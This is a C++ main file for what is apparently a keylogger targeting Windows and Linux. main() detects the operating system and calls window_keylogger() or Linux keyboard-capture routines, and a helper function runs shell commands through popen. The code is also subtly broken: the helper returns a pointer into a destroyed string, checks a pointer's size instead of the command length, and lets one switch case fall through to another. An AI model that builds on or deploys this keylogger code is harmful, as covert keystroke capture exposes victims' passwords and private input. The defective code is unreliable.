#include <cstdio>
#include <string>
#include <iostream>
#include <fstream>
#include <memory>
#include <array>
#include <chrono>
#include "main.hpp"
// ReSharper disable once CppUnusedIncludeDirective
#include "linux_logger.hpp"
#include "window_logger.hpp"


//runs commands on the terminal
//I needed this, mainly for linux to get the device type and event, but I am using the os function for possible
const char* exc(const char* cmd) {
    int os = type_os();

    switch (os) {
        case 0:
            throw std::exception();
            break;
        case 1:
            return "not made yet/needed yet";
            break;
        case 2:
            if constexpr (sizeof(cmd) <= 128) {
                std::array<char, 128> buffer{};
                std::string result;
                std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
                if (!pipe) {
                    throw std::exception();
                }
                while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
                    result += buffer.data();
                }

                return result.c_str();
            }
        break;
    }
    return nullptr;

}



int main() {
    switch (int os = type_os()) {
        case 1:
#ifdef __WIN32__
                std::cout << "windows" << std::endl;
                window_keylogger();
                return 0;
#endif

        case 2:
#if defined(__linux__) || defined(__unix__)
            find_keyboard();
            one_time_creation();
            linux_keyboard();
            return 0;
#endif
        default:
            std::cout << "should not happen" << std::endl;
            return 1;
    }

}
